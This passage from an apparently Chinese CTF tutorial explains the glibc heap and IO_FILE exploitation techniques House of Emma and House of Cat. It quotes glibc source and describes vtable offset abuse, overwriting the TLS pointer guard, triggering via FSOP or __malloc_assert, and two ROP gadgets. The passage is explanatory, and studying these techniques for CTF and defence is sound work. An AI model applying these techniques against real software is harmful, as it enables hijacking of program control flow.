<p>因此在新版中各种各样的限制下，迫使转变思想：从以往的 <strong>任意地址申请</strong> <strong>→</strong> <strong>构成任意读写</strong> →<strong>从而 Getshell</strong> ，转变为：在某处写一个可控地址直接 Getshell（借助于 IO_FILE）。显而易见的，后者的所需条件一定是少于前者的。</p>
<p><strong>利用条件:</strong></p>
<ol>
<li>可以任意写一个可控地址（LargeBin Attack,Tcache Stashing Unlink Attack…）</li>
<li>可以触发 IO 流（FSOP,House OF Kiwi）</li>
</ol>
<p><strong>利用效果:</strong>控制流</p>
<p><strong>有效版本:</strong></p>
<h2 id="原理-12"><a href="#原理-12" class="headerlink" title="原理"></a>原理</h2><p>在 vtable 的合法范围内，存在一个 <strong>_IO_cookie_jumps</strong>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_cookie_jumps</span> <span class="title">libio_vtable</span> =</span> &#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_file_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_file_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_file_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_default_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_file_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_cookie_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_file_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_file_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_file_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_cookie_read),</span><br><span class="line">  JUMP_INIT(write, _IO_cookie_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_cookie_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_cookie_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue),</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>在 vtable 的检测中对具体位置的检测还是比较宽松的,只是检查是否在vtable段内，这使得可以在一定的范围内对 vtable 表的起始位置进行偏移，使其在调用<strong>具体偏移是固定</strong>的情况下，可以通过偏移来调用在 vtable 表中的任意函数，因此考虑将其指定为以下几个函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line">_IO_cookie_read (FILE *fp, <span class="type">void</span> *buf, <span class="type">ssize_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_read_function_t</span> *read_cb = cfile-&gt;__io_functions.read;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (read_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (read_cb == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> read_cb (cfile-&gt;__cookie, buf, size);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line">_IO_cookie_write (FILE *fp, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">ssize_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_write_function_t</span> *write_cb = cfile-&gt;__io_functions.write;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (write_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (write_cb == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="type">ssize_t</span> n = write_cb (cfile-&gt;__cookie, buf, size);</span><br><span class="line">  <span class="keyword">if</span> (n &lt; size)</span><br><span class="line">    fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">off64_t</span></span><br><span class="line">_IO_cookie_seek (FILE *fp, <span class="type">off64_t</span> offset, <span class="type">int</span> dir)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_seek_function_t</span> *seek_cb = cfile-&gt;__io_functions.seek;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (seek_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> ((seek_cb == <span class="literal">NULL</span></span><br><span class="line">       || (seek_cb (cfile-&gt;__cookie, &amp;offset, dir)</span><br><span class="line">           == <span class="number">-1</span>)</span><br><span class="line">       || offset == (<span class="type">off64_t</span>) <span class="number">-1</span>)</span><br><span class="line">      ? _IO_pos_BAD : offset);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line">_IO_cookie_close (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_close_function_t</span> *close_cb = cfile-&gt;__io_functions.close;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (close_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (close_cb == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> close_cb (cfile-&gt;__cookie);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这几个函数内存在任意函数指针调用，且函数指针来源于_IO_cookie_file 结构体，<strong>这个结构体是 _IO_FILE_plus 的扩展</strong>，如果可以控制 IO 的内容，大概率这部分的数据也是可控的，并且其的<strong>第一个参数也是来源于这个结构.也就是可以控制rdi</strong>所以可以把其当做一个类似于 __free_hook 的 Hook 来利用。</p>
<p>结构体定义在glibc/libio/libioP.h中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Special file type for fopencookie function.  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> __<span class="title">fp</span>;</span></span><br><span class="line">  <span class="type">void</span> *__cookie;</span><br><span class="line">  <span class="type">cookie_io_functions_t</span> __io_functions;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_io_functions_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">cookie_read_function_t</span> *read;        <span class="comment">/* Read bytes.  */</span></span><br><span class="line">  <span class="type">cookie_write_function_t</span> *write;    <span class="comment">/* Write bytes.  */</span></span><br><span class="line">  <span class="type">cookie_seek_function_t</span> *seek;        <span class="comment">/* Seek/tell file position.  */</span></span><br><span class="line">  <span class="type">cookie_close_function_t</span> *close;    <span class="comment">/* Close file.  */</span></span><br><span class="line">&#125; <span class="type">cookie_io_functions_t</span>;</span><br></pre></td></tr></table></figure>
<p><strong>绕过 PTR_DEMANGLE</strong></p>
<p>在上面的分析中，暂时忽略了一个可能会存在的问题，也就是在上面代码中函数指针调用前所执行的 PTR_DEMANGLE （指针保护）选项是默认开启的，也就是<code>cookie_io_functions_t</code>中的值应该是加密过后的,这意味着需要解决指针加密的问题。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="type">uintptr_t</span> __pointer_chk_guard attribute_relro;</span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> PTR_MANGLE(var) \</span></span><br><span class="line"><span class="meta">  (var) = (__typeof (var)) ((uintptr_t) (var) ^ __pointer_chk_guard)</span></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> PTR_DEMANGLE(var) PTR_MANGLE (var)</span></span><br></pre></td></tr></table></figure>
<p>根据 <strong>GLIBC Wiki</strong> 上的解释，可以得知这个是 GLIBC 的一项安全功能，用于增加攻击者在 GLIBC 结构中操纵指针（尤其是函数指针）的难度。这时，通过调试可以得知，这个值存在于 TLS 段上，将其 ROR 移位 0x11 后再与指针进行异或。</p>
<p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/940906_U9ZGVURG434TPE6.png" alt=""></p>
<p>fs[0x30] 的值位于与 libc 相邻的空间中，<strong>这个位置距离 libc 地址的偏移固定</strong>，虽然无法泄露<strong>出这个位置随机值的内容</strong>,但是可以<strong>利用很多方法对其进行写入</strong>：</p>
<ol>
<li>Fastbin Reverse Into Tcache</li>
<li>Tcache Stashing Unlink Attack</li>
<li>LargeBin Attack</li>
</ol>
<p>但无论使用什么方法，根本思想：还是让这个本来是随机的、不确定的异或值，转变为已知的地址。而通常在满足能够利用 IO_FILE 的情况下，这个前置要求都能够被满足。</p>
<p>最后因为emma调用链中<strong>rdi是可控</strong>的,所以可以在setcontetxt之前用一些gadget<strong>先由rdi控制rdx</strong></p>
<p>例如如下两个,分别在2.38和2.31找到的gadget</p>
<p><code>mov rdx, qword ptr [rdi + 8]; mov rax, qword ptr [rdi]; mov rdi, rdx; jmp rax;</code></p>
<p><code>mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];</code></p>
<h3 id="实操可能的问题"><a href="#实操可能的问题" class="headerlink" title="实操可能的问题"></a>实操可能的问题</h3><p>如果我们的选择的是利用house of kiwi来触发stderr的io流函数,在实际操作中，可能因为 stderr 的指针存放在 bss 段上，从而导致无法篡改。</p>
<p>只能使用 exit 来触发 FSOP，但是又会发现如果通过 exit 来触发 FSOP，<strong>会遇到在 exit 中也有调用指针保护的函数指针执行，但此时的异或内容被我们所篡改，使得无法执行正确的函数地址</strong>，且此位置在 FSOP 之前，从而导致程序没有进入 IO 流就发生了错误。</p>
<p>这种时候就可以考虑构造两个 IO_FILE，且后者指针处于前者的 _chains 处，前者用 <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/216290">GLIBC2.24 之前的 IO_FILE 攻击</a> 的思想在 __pointer_chk_guard 处写已知内容，后者再用 House_OF_Emma 来进行函数指针调用。 </p>
<h2 id="例题-5"><a href="#例题-5" class="headerlink" title="例题"></a>例题</h2><p><strong>2021湖湘杯-House_OF_Emma</strong></p>
<h1 id="house-of-cat"><a href="#house-of-cat" class="headerlink" title="house of cat"></a>house of cat</h1><h2 id="概要-13"><a href="#概要-13" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>House of Cat利用了House of emma的虚表偏移修改思想，通过修改虚表指针的偏移，避免了对需要绕过TLS上 <strong>_pointer_chk_guard</strong>的检测相关的IO函数的调用，转而调用<strong>_IO_wfile_jumps</strong>中的<strong>_IO_wfile_seekoff</strong>函数，然后进入到<strong>_IO_switch_to_wget_mode</strong>函数中来攻击，从而使得攻击条件和利用变得更为简单。并且house of cat在<strong>FSOP</strong>的情况下也是可行的，只需修改虚表指针的偏移来调用<strong>_IO_wfile_seekoff</strong>即可（通常是结合<strong>__malloc_assert</strong>，改vtable为<strong>_IO_wfile_jumps+0x10</strong>）。</p>
<p><strong>利用条件:</strong></p>
<ol>
<li>可以任意写一个可控地址（LargeBin Attack,Tcache Stashing Unlink Attack…）</li>
<li>能够泄露堆地址和libc基址</li>
<li>能够触发IO流(FSOP或触发__malloc_assert,或者程序中存在puts等能进入IO链的函数),执行IO相关函数</li>
</ol>
<p><strong>利用效果:</strong>控制流</p>
<p><strong>有效版本:</strong>ALL</p>
<h2 id="原理-13"><a href="#原理-13" class="headerlink" title="原理"></a>原理</h2><p>在高版本libc中，当攻击条件有限（如不能造成任意地址写）或者libc版本中无hook函数（libc2.34及以后）时，伪造fake_IO进行攻击是一种常见可行的攻击方式，常见的触发IO函数的方式有FSOP、__malloc_assert（当然也可以用puts等函数，<strong>只不过需要任意地址写任意值直接改掉libc中的stdout结构体</strong>），<strong>当进入IO流时会根据vtable指针调用相关的IO函数</strong>，如果在题目中造成任意地址写一个可控地址（如large bin attack、tcache stashing unlink attack、fastbin reverse into tcache），然后伪造fake_IO结构体配合恰当的IO调用链，可以达到控制程序执行流的效果。</p>
<p>House of emma是glibc2.34下常用的攻击手法之一，利用条件只需任意写一个可控地址就可以控制程序执行流，攻击威力十分强大。但是需要攻击位于TLS的<strong>_pointer_chk_guard</strong>，并且远程可能需要爆破TLS偏移。</p>
<h3 id="vtable检查"><a href="#vtable检查" class="headerlink" title="vtable检查"></a>vtable检查</h3><p>在glibc2.24以后加入了对虚函数的检测，在调用虚函数之前首先会检查虚函数地址的合法性。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> _IO_vtable_check (<span class="type">void</span>) attribute_hidden;</span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *</span><br><span class="line"><span class="title function_">IO_validate_vtable</span> <span class="params">(<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uintptr_t</span> section_length = __stop___libc_IO_vtables -__start___libc_IO_vtables;</span><br><span class="line">  <span class="type">uintptr_t</span> ptr = (<span class="type">uintptr_t</span>) vtable;</span><br><span class="line">  <span class="type">uintptr_t</span> offset = ptr -(<span class="type">uintptr_t</span>)__start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其检查流程为：计算_IO_vtable 段的长度（section_length），用当前虚表指针的地址减去_IO_vtable 段的开始地址，如果vtable相对于开始地址的偏移大于等于section_length，那么就会进入_IO_vtable_check进行更详细的检查，否则的话会正常调用。如果vtable是非法的，进入_IO_vtable_check函数后会触发abort。</p>
<p>虽然对vtable的检查较为严格，但是对于具体位置和具体偏移的检测则是较为宽松的，<strong>可以修改vtable指针为虚表段内的任意位置</strong>，也就是对于某一个<strong>_IO_xxx_jumps</strong>的任意偏移，使得其调用攻击者想要调用的IO函数。</p>
<h3 id="malloc-assert与FSOP"><a href="#malloc-assert与FSOP" class="headerlink" title="__malloc_assert与FSOP"></a>__malloc_assert与FSOP</h3><p>在glibc中存在一个函数_malloc_assert，其中会根据vtable表如_IO_xxx_jumps调用IO等相关函数；</p>
<p><strong>该函数最终会根据<code>stderr</code>这个IO结构体进行相关的IO操作</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__malloc_assert (<span class="type">const</span> <span class="type">char</span> *assertion, <span class="type">const</span> <span class="type">char</span> *file, <span class="type">unsigned</span> <span class="type">int</span> line,</span><br><span class="line">         <span class="type">const</span> <span class="type">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">  (<span class="type">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">             __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">             file, line,</span><br><span class="line">             function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">             assertion);</span><br><span class="line">  fflush (<span class="built_in">stderr</span>);</span><br><span class="line">  <span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>house of kiwi提供了一种调用该函数的思路，可以通过修改topchunk的大小触发，即满足下列条件中的一个</p>
<blockquote>
<p>1.topchunk的大小小于MINSIZE(0X20)<br>2.prev inuse位为0<br>3.old_top页未对齐</p>
</blockquote>
<hr>
<p>下面介绍另一种触发house of cat的方式FSOP</p>
<p>程序中所有的_IO_FILE 结构用_chain连接形成一个单链表，链表的头部则是_IO_list_all</p>
<p>FSOP就是通过劫持_IO_list_all的值（如large bin attack修改）来执行<code>_IO_flush_all_lockp</code>函数，<strong>这个函数会根据_IO_list_all刷新链表中的所有文件流，</strong></p>
<p>在libc中代码如下:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="type">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">       ...</span><br><span class="line">       <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base))</span><br><span class="line">               &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">           &#123;</span><br><span class="line">               result = EOF;</span><br><span class="line">          &#125;</span><br><span class="line">        ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>其中会调用vtable中的IO函数_IO_OVERFLOW，根据上面所说的虚表偏移可变思想，这个地方的虚表偏移也是可修改的，然后配合伪造IO结构体可以执行house of cat的调用链</strong></p>
<p>FSOP有三种情况</p>
<ol>
<li>能从main函数中返回</li>
<li>程序中能执行exit函数</li>
<li>libc中执行abort</li>
</ol>
<p><strong>第三种情况在高版本中已经删除</strong>;</p>
<p>__malloc_assert则是在malloc中触发，通常是修改top chunk的大小。</p>
<h3 id="一种可行的IO调用链"><a href="#一种可行的IO调用链" class="headerlink" title="一种可行的IO调用链"></a>一种可行的IO调用链</h3><p>在<strong>_IO_wfile_jumps</strong>结构体中，会根据虚表进行相关的函数调用。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_wfile_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_new_file_finish),</span><br><span class="line">  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wfile_overflow),</span><br><span class="line">  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wfile_underflow),</span><br><span class="line">  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_wfile_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_file_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_wfile_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_new_file_setbuf),</span><br><span class="line">  JUMP_INIT(sync, (_IO_sync_t) _IO_wfile_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_wfile_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_file_read),</span><br><span class="line">  JUMP_INIT(write, _IO_new_file_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_file_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_file_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_file_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>其中<strong>_IO_wfile_seekoff</strong>函数代码如下(<strong>glibc/libio/wfileops.c</strong>)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">off64_t</span></span><br><span class="line">_IO_wfile_seekoff (FILE *fp, <span class="type">off64_t</span> offset, <span class="type">int</span> dir, <span class="type">int</span> mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">off64_t</span> result;</span><br><span class="line">  <span class="type">off64_t</span> delta, new_offset;</span><br><span class="line">  <span class="type">long</span> <span class="type">int</span> count;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (mode == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> do_ftell_wide (fp);</span><br><span class="line">  <span class="type">int</span> must_be_exact = ((fp-&gt;_wide_data-&gt;_IO_read_base</span><br><span class="line">            == fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">               &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_base</span><br><span class="line">               == fp-&gt;_wide_data-&gt;_IO_write_ptr));</span><br><span class="line">#需要绕过was_writing的检测</span><br><span class="line">  <span class="type">bool</span> was_writing = ((fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">               &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">              || _IO_in_put_mode (fp));</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (was_writing &amp;&amp; _IO_switch_to_wget_mode (fp))</span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中fp结构体是我们可以伪造的，可以控制fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base来调用_IO_switch_to_wget_mode这个函数，继续跟进代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_switch_to_wget_mode (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WOVERFLOW (fp, WEOF) == WEOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><u>而_IO_WOVERFLOW是glibc里定义的一个宏调用函数</u></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br></pre></td></tr></table></figure>
<p><strong><u>对_IO_WOVERFLOW没有进行任何检测</u></strong>，为了便于理解，我们再来看看汇编代码</p>
